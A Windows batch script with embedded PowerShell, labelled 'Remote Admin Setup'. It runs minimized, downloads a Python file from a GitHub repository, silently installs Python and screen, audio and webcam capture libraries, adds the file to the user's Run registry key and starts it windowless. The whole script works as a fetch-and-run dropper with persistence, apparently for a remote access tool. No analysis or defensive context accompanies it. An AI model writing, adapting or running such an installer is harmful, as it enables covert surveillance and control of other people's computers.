@echo off
if not "%1"=="min" (
    start "" /min "%~f0" min
    exit /b
)
setlocal EnableExtensions
title Remote Admin Setup
set "INSTALL_DIR=%LOCALAPPDATA%\RemoteAdmin"
set "TARGET=%INSTALL_DIR%\file.pyw"
set "RUN_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "RUN_NAME=Remote Admin"
set "GH_REPO=lightyagamixkira/downloader"
set "GH_ASSET=file.pyw"

set "GH_TEMP_PS=%TEMP%\ra_update.ps1"
set "DOWNLOAD=%USERPROFILE%\Downloads\file.pyw"
set "SELF=%~f0"
set "PY_VERSION=3.12.10"
set "PY_URL=https://www.python.org/ftp/python/%PY_VERSION%/python-%PY_VERSION%-amd64.exe"
set "PY_INSTALLER=%TEMP%\python-%PY_VERSION%-amd64.exe"
set "PY_EXPECTED=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"

if defined RA_GH_REPO set "GH_REPO=%RA_GH_REPO%"

echo Checking the latest file in the public GitHub repository...

powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=[IO.File]::ReadAllText($env:SELF); $a='#PS'+'START#'; $b='#PS'+'END#'; $s=$c.IndexOf($a)+$a.Length; $e=$c.IndexOf($b); if ($s -lt $a.Length -or $e -lt $s) { exit 9 }; [IO.File]::WriteAllText($env:GH_TEMP_PS, $c.Substring($s, $e - $s))"
if errorlevel 1 goto PS_ERROR

powershell -NoProfile -ExecutionPolicy Bypass -File "%GH_TEMP_PS%" -Repo "%GH_REPO%" -Asset "%GH_ASSET%" -InstalledPath "%TARGET%" -OutFile "%DOWNLOAD%"
set "CODE=%errorlevel%"

if exist "%GH_TEMP_PS%" del /q "%GH_TEMP_PS%" >nul 2>&1
if "%CODE%"=="10" goto ALREADY_CURRENT
if "%CODE%"=="0" goto HAVE_FILE
if "%CODE%"=="5" goto DOWNLOAD_ERROR
goto DOWNLOAD_ERROR

:ALREADY_CURRENT
echo.
echo The Downloads copy is already the same size as the latest version.
echo No changes were made.
echo.
pause
exit /b 0

:HAVE_FILE
call :ENSURE_PYTHON
if not defined PYTHON goto PYTHON_FAILED
call :ENSURE_DEPS
if errorlevel 1 goto DEPS_FAILED
if exist "%TARGET%" goto UPDATE
goto INSTALL

:INSTALL
echo Installing Remote Admin...
echo.
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    if errorlevel 1 (
        echo [ERROR] Could not create %INSTALL_DIR%
        goto FAIL
    )
)
call :STOP_CLIENT
if exist "%INSTALL_DIR%\file.exe" del /q "%INSTALL_DIR%\file.exe" >nul 2>&1
copy /Y "%DOWNLOAD%" "%TARGET%" >nul
if errorlevel 1 goto COPY_ERROR
call :REGISTER_STARTUP
echo Starting client...
start "" "%PYTHONW%" "%TARGET%"
echo.
echo Done. Installed to %TARGET%, set to start at login, and launched.
pause
exit /b 0

:UPDATE
echo Updating Remote Admin to the latest version...
echo.
call :STOP_CLIENT
if exist "%INSTALL_DIR%\file.exe" del /q "%INSTALL_DIR%\file.exe" >nul 2>&1
copy /Y "%DOWNLOAD%" "%TARGET%" >nul
if errorlevel 1 goto COPY_ERROR
call :REGISTER_STARTUP
echo Starting client...
start "" "%PYTHONW%" "%TARGET%"
echo.
echo Done. Updated %TARGET% to the latest version and launched it.
pause
exit /b 0

:UNINSTALL
echo The installed copy is already current. Uninstalling...
echo.
call :STOP_CLIENT
echo Removing the startup entry...
reg delete "%RUN_KEY%" /v "%RUN_NAME%" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "%RUN_NAME%" /f >nul 2>&1
echo Removing installed files...
if exist "%INSTALL_DIR%" rmdir /s /q "%INSTALL_DIR%"
echo.
echo Done. Removed from startup and deleted %INSTALL_DIR%.
pause
exit /b 0

:PYTHON_FAILED
echo.
echo [ERROR] Could not set up Python 3 on this PC.
echo         Check the internet connection, or install Python 3 manually from
echo         https://www.python.org/downloads/windows/
echo         (tick "Add python.exe to PATH"), then run setup.bat again.
goto FAIL

:DEPS_FAILED
echo.
echo [ERROR] Could not install the required Python packages.
echo         Run this manually, then try again:
echo           "%PYTHON%" -m pip install requests Pillow sounddevice opencv-python
goto FAIL

:PS_ERROR
echo.
echo [ERROR] Could not unpack the updater from setup.bat.
goto FAIL

:API_ERROR
echo.
echo [ERROR] Could not check the public raw GitHub file.
goto FAIL

:DOWNLOAD_ERROR
echo.
echo [ERROR] The download failed. The previous file was left unchanged.
goto FAIL

:COPY_ERROR
echo.
echo [ERROR] Could not copy the new build to %INSTALL_DIR%
goto FAIL

:FAIL
if exist "%GH_TEMP_PS%" del /q "%GH_TEMP_PS%" >nul 2>&1
if exist "%PY_INSTALLER%" del /q "%PY_INSTALLER%" >nul 2>&1
pause
exit /b 1

:STOP_CLIENT
echo Stopping any running client...
taskkill /IM file.exe /F >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'pythonw.exe' -and $_.CommandLine -like '*RemoteAdmin*file.pyw*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
exit /b 0

:REGISTER_STARTUP
echo Registering startup...
reg add "%RUN_KEY%" /v "%RUN_NAME%" /t REG_SZ /d "\"%PYTHONW%\" \"%TARGET%\"" /f >nul
if errorlevel 1 (
    echo [WARNING] Could not register the startup entry.
)
exit /b 0

:FIND_PYTHON
set "PYTHON="
set "PYTHONW="
for /f "delims=" %%I in ('python -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON=%%I"
if not defined PYTHON for /f "delims=" %%I in ('py -3 -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON=%%I"
if not defined PYTHON exit /b 0
"%PYTHON%" -c "import sys; raise SystemExit(0 if sys.version_info[0] == 3 else 1)" >nul 2>&1
if errorlevel 1 set "PYTHON="
if not defined PYTHON exit /b 0
for %%I in ("%PYTHON%") do set "PYTHONW=%%~dpIpythonw.exe"
if not exist "%PYTHONW%" set "PYTHON="
exit /b 0

:ENSURE_PYTHON
call :FIND_PYTHON
if defined PYTHON exit /b 0
echo Python 3 was not found. Downloading the official installer...
if exist "%PY_INSTALLER%" del /q "%PY_INSTALLER%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri $env:PY_URL -OutFile $env:PY_INSTALLER"
if errorlevel 1 goto PYTHON_FAILED
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-AuthenticodeSignature -LiteralPath $env:PY_INSTALLER; if ($s.Status -ne 'Valid' -or $s.SignerCertificate.Subject -notlike '*Python Software Foundation*') { exit 1 }"
if errorlevel 1 goto PYTHON_FAILED
echo Installing Python 3 (per-user, no admin)...
"%PY_INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_launcher=0 InstallLauncherAllUsers=0 Include_test=0 Include_doc=0 Include_tcltk=0 Shortcuts=0
del /q "%PY_INSTALLER%" >nul 2>&1
set "PYTHON=%PY_EXPECTED%"
if not exist "%PYTHON%" for /f "delims=" %%I in ('dir /b /s "%LOCALAPPDATA%\Programs\Python\python.exe" 2^>nul') do set "PYTHON=%%I"
if not exist "%PYTHON%" goto PYTHON_FAILED
for %%I in ("%PYTHON%") do set "PYTHONW=%%~dpIpythonw.exe"
if not exist "%PYTHONW%" goto PYTHON_FAILED
exit /b 0

:ENSURE_DEPS
"%PYTHON%" -c "import requests, PIL, sounddevice, cv2" >nul 2>&1
if not errorlevel 1 exit /b 0
echo Installing required Python packages...
"%PYTHON%" -m pip install --user --disable-pip-version-check --no-warn-script-location requests Pillow sounddevice opencv-python
if errorlevel 1 exit /b 1
"%PYTHON%" -c "import requests, PIL, sounddevice, cv2" >nul 2>&1
if errorlevel 1 exit /b 1
exit /b 0

#PSSTART#
param(
    [string]$Repo = "lightyagamixkira/downloader",
    [string]$Asset = "file.pyw",
    [string]$InstalledPath = "",
    [string]$OutFile = ""
)
$ErrorActionPreference = "Stop"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    $url = "https://raw.githubusercontent.com/$Repo/main/$Asset"
    if (-not $OutFile) { throw "Missing output path." }

    $directory = Split-Path -Parent $OutFile
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }

    # Check the remote size before downloading. Equal size means no update.
    $remoteSize = -1L
    try {
        $head = Invoke-WebRequest -Uri $url -Method Head -UseBasicParsing -TimeoutSec 30
        $lengthHeader = $head.Headers['Content-Length']
        if ($lengthHeader -match '^\d+$') { $remoteSize = [long]$lengthHeader }
    } catch {
        throw "Could not check the raw GitHub file: $($_.Exception.Message)"
    }

    if ((Test-Path -LiteralPath $OutFile) -and $remoteSize -ge 0) {
        $localSize = (Get-Item -LiteralPath $OutFile).Length
        if ($localSize -eq $remoteSize) {
            Write-Output "The Downloads copy already has the current file size. No changes made."
            exit 10
        }
    }

    $tempFile = Join-Path $env:TEMP ("downloader-" + [guid]::NewGuid().ToString() + ".tmp")
    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -TimeoutSec 120
        $downloadSize = (Get-Item -LiteralPath $tempFile).Length
        if ($downloadSize -le 0) { throw "The downloaded file is empty." }
        if ($remoteSize -ge 0 -and $downloadSize -ne $remoteSize) {
            throw "Downloaded size does not match the remote Content-Length."
        }
        Move-Item -LiteralPath $tempFile -Destination $OutFile -Force
    } finally {
        if (Test-Path -LiteralPath $tempFile) {
            Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
        }
    }
    Write-Output "Downloaded the current $Asset from $url"
    exit 0
} catch {
    [Console]::Error.WriteLine($_.Exception.Message)
    exit 5
}
#PSEND#